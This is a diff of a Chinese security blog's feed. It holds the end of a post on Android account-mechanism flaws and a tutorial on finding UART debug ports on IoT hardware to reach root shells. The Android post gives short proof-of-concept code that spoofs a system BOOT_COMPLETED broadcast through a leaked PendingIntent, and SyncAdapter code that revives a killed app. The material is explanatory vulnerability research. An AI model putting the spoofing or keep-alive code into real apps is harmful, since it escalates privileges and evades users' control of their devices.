+<h4 id="复现代码：-1"><a href="#复现代码：-1" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PendingIntent pending_intent = (PendingIntent) <span class="keyword">options</span>.get(<span class="string">"pendingIntent"</span>);</div><div class="line">Intent intent = <span class="keyword">new</span> Intent();</div><div class="line">intent.setAction(<span class="string">"android.intent.action.BOOT_COMPLETED"</span>);</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    pending_intent.send(context, <span class="number">0</span>, intent, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</div><div class="line">&#125; <span class="keyword">catch</span> (PendingIntent.CanceledException e) &#123;</div><div class="line">    Log.e(<span class="string">"addAccount Exception"</span>, e.toString());</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">options</span>;</div></pre></td></tr></table></figure></p>
+<p>这里我们在addAccount方法里获取pendingIntent,然后声明一个启动成功Action的Intent，最后让pendingIntent发送带有启动成功Action的广播。由于pendingIntent是系统级别的，所以发出的广播也是系统级别的，于是android系统就会收到该广播，然后执行系统启动成功之后的逻辑。</p>
+<h4 id="复现截图：-1"><a href="#复现截图：-1" class="headerlink" title="复现截图："></a>复现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/15.png" alt=""></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/16.png" alt=""></p>
+<h4 id="漏洞修复：-1"><a href="#漏洞修复：-1" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>Android 5.0的源码中修复了该漏洞，方法是把放入mPendingIntent的intent，由原来简单的new Intent()改为事先经过一系列填充的identityIntent。这样做，就可以防止第三方的Authenticator（主要是针对木马）进行二次填充。修复代码如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Intent identityIntent = new Intent()<span class="comment">;  </span></div><div class="line">identityIntent.setComponent(new ComponentName(<span class="keyword">SHOULD_NOT_RESOLVE, </span><span class="keyword">SHOULD_NOT_RESOLVE)); </span> </div><div class="line">identityIntent.setAction(<span class="keyword">SHOULD_NOT_RESOLVE); </span> </div><div class="line">identityIntent.<span class="keyword">addCategory(SHOULD_NOT_RESOLVE); </span> </div><div class="line">mPendingIntent = PendingIntent.getBroadcast(this, <span class="number">0</span>, identityIntent, <span class="number">0</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/17.png" alt=""></p>
+<h3 id="系统拉活进程"><a href="#系统拉活进程" class="headerlink" title="系统拉活进程"></a>系统拉活进程</h3><p>之前在做项目的时候，为了保证APP可以在手机长期存活，我找到了利用Android账户同步机制来拉活APP的进程。在华为6.0、4.4的版本测试可以拉活，在oppo5.0版本测试可以拉活，但是在小米6.0下，杀死进程后就无法通过账户机制拉活，我猜测是小米对账户机制进行了修改。</p>
+<h4 id="SyncAdapter介绍："><a href="#SyncAdapter介绍：" class="headerlink" title="SyncAdapter介绍："></a>SyncAdapter介绍：</h4><p> Android提供了SyncAdapter类用于需要同步本地数据和在线账户信息的应用，如电子邮件的定时收取、笔记应用的云备份、天气应用的及时同步等。它的优势在于可以根据不同条件自动发起数据传输，比如数据变更，间隔一定时间，或者是每天定时。而且，系统会将暂时不能运行的操作添加到队列里，在可能的情况下重新发起。</p>
+<h4 id="漏洞原理：-2"><a href="#漏洞原理：-2" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p> 因为账户同步服务是系统维护的一个服务，所以我们的同步的进程是跟随系统的生命周期走，这就意味着只要不关机，这个服务会一直运行，帮我们同步账号。我们看一下功能流程图：</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/18.png" alt=""></p>
+<p>上图是我总结了Android利用SyncAdapter同步账户的逻辑，而开发者可以随意重写onPerformSync()的内容，因此我们可以在onPerformSync()方法中去开启我们APP的Activity、Service等，一旦启动了Activity、Service之后，就等于拉活了我们APP的进程。</p>
+<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/19.png" alt=""></p>
+<h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><p>MainActivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">ContentResolver.setIsSyncable(account, AccountProvider.AUTHORITY, <span class="number">1</span>)<span class="comment">;</span></div><div class="line">ContentResolver.setSyncAutomatically(account, AccountProvider.AUTHORITY, true)<span class="comment">;</span></div><div class="line">ContentResolver.setMasterSyncAutomatically(true)<span class="comment">;</span></div><div class="line">ContentResolver.<span class="keyword">addPeriodicSync(account, </span>AccountProvider.AUTHORITY, <span class="keyword">bundle, </span><span class="number">300</span>)<span class="comment">;//开启同步</span></div><div class="line"></div><div class="line"><span class="keyword">SyncService类：</span></div><div class="line">@Override</div><div class="line">public void onPerformSync(Account account, <span class="keyword">Bundle </span><span class="keyword">bundle, </span>String s, ContentProviderClient contentProviderClient, <span class="keyword">SyncResult </span><span class="keyword">syncResult) </span>&#123;</div><div class="line">            Intent i = new Intent(<span class="keyword">SyncService.this, </span>TestActivity.class)<span class="comment">;//开启活动</span></div><div class="line">            startActivity(i)<span class="comment">;</span></div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>我们在mainActivity利用ContentResolver去开启账户同步，设置同步周期，然后系统执行同步操作时，会执行onPerformSync()方法，我在该方法中去开启APP中的TestActivity活动。</p>
+<h4 id="实现截图："><a href="#实现截图：" class="headerlink" title="实现截图："></a>实现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/21.png" alt=""></p>
+<h4 id="漏洞修复：-2"><a href="#漏洞修复：-2" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>由于该机制可定制度太高，而且比较冷门的功能，因此google一直没有去修补这块，不过小米有阉割掉了这里的拉活，而且刚刚用原生Android 8.0系统测了一下，貌似也是拉活不了。8.0以下都可以拉活。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Android账户机制本身意义是google为了方便用户，不需要总是APP登录和验证账户信息，由系统来维护这些账户的验证。换个思路，这就是为攻击者提供了可以利用的提取系统权限的攻击点。我们在之后的研究可以多找找有系统提供的服务或者间接调用了系统服务的功能，这样可以让系统为我们“服务”。<br>目前大多数手机厂商针对于账户机制这些相对冷门的功能没有太大的关注，所以在各自品牌手机的rom包中，对于这些机制也未再进行认真的检验处理，这样也就导致很多原生系统存在的漏洞，在各大手机厂商上面同样可以进行攻击，所以需要系统开发人员认真的关注这些功能。</p>
+<p>##参考文档：<br>LAUNCHANYWHERE: ACTIVITY组件权限绕过漏洞解析(GOOGLE BUG 7699048 )：<br><a href="http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/</a></p>
+<p>Android BroadcastAnyWhere(Google Bug 17356824)漏洞详细分析：<br><a href="https://blog.csdn.net/l173864930/article/details/41246255/" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/l173864930/article/details/41246255/</a></p>
+<p>android添加账户源码浅析：<br><a href="http://www.cnblogs.com/vendanner/p/5122865.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.cnblogs.com/vendanner/p/5122865.html</a></p>
+<p>broadAnywhere：Broadcast组件权限绕过漏洞（Bug: 17356824）<br><a href="http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/</a></p>
+<p>Android的账号与同步机制<br><a href="https://blog.csdn.net/hehui1860/article/details/36900775" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/hehui1860/article/details/36900775</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令
+    
+    </summary>
+    
+      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="Android" scheme="http://www.future-sec.com/tags/Android/"/>
+    
+  </entry>
+  
+  <entry>
     <title>MikroTik RouterOS &lt; 6.38.4 (x86) 远程代码执行漏洞分析</title>
-    <link href="http://www.future-sec.com/mik.html"/>
-    <id>http://www.future-sec.com/mik.html</id>
+    <link href="http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html"/>
+    <id>http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html</id>
     <published>2018-04-14T16:00:00.000Z</published>
     <updated>2018-06-29T09:01:06.020Z</updated>
     
@@ -914,6 +1092,38 @@ H2 = 0
   </entry>
   
   <entry>
+    <title>物联网硬件安全分析基础-串口调试</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
+    <published>2017-12-04T16:00:00.000Z</published>
+    <updated>2018-06-29T09:01:11.049Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p>
+<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image65.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image66.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image68.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image69.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image101.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image71.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image72.jpg" alt="img"></p>
+<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image73.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image74.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image75.jpg" alt="img"></p>
+<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image76.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image78.jpg" alt="img"></p>
+<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image79.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image81.jpg" alt="img"></p>
+<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image82.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image84.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image86.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image87.jpg" alt="img"></p>
+<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image88.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image90.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image91.jpg" alt="img"></p>
+<h3 id="案例六：调试某语音机器人"><a href="#案例六：调试某语音机器人" class="headerlink" title="案例六：调试某语音机器人"></a>案例六：调试某语音机器人</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image122.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image124.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image125.jpg" alt="img"></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
     <title>你在互联网上的数据还在裸奔吗？</title>
     <link href="http://www.future-sec.com/android-ssl-security.html"/>
     <id>http://www.future-sec.com/android-ssl-security.html</id>
@@ -955,91 +1165,6 @@ H2 = 0
       <category term="ssl" scheme="http://www.future-sec.com/tags/ssl/"/>
     
       <category term="https" scheme="http://www.future-sec.com/tags/https/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>物联网硬件安全分析基础-串口调试</title>
-    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
-    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
-    <published>2017-12-04T16:00:00.000Z</published>
-    <updated>2018-06-29T09:01:11.049Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p>
-<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image65.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image66.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image68.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image69.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image101.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image71.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image72.jpg" alt="img"></p>
-<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image73.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image74.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image75.jpg" alt="img"></p>
-<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image76.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image78.jpg" alt="img"></p>
-<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image79.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image81.jpg" alt="img"></p>
-<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image82.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image84.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image86.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image87.jpg" alt="img"></p>
-<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image88.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image90.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image91.jpg" alt="img"></p>
-<h3 id="案例六：调试某语音机器人"><a href="#案例六：调试某语音机器人" class="headerlink" title="案例六：调试某语音机器人"></a>案例六：调试某语音机器人</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image122.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image124.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image125.jpg" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>物联网硬件安全分析基础-固件提取</title>
-    <link href="http://www.future-sec.com/iot-security-hardware-obtain.html"/>
-    <id>http://www.future-sec.com/iot-security-hardware-obtain.html</id>
-    <published>2017-11-26T16:00:00.000Z</published>
-    <updated>2018-06-29T09:01:10.629Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p>
-<h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image36.jpg" alt="img"></p>
-<h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/image37.jpg" alt="img"></p>
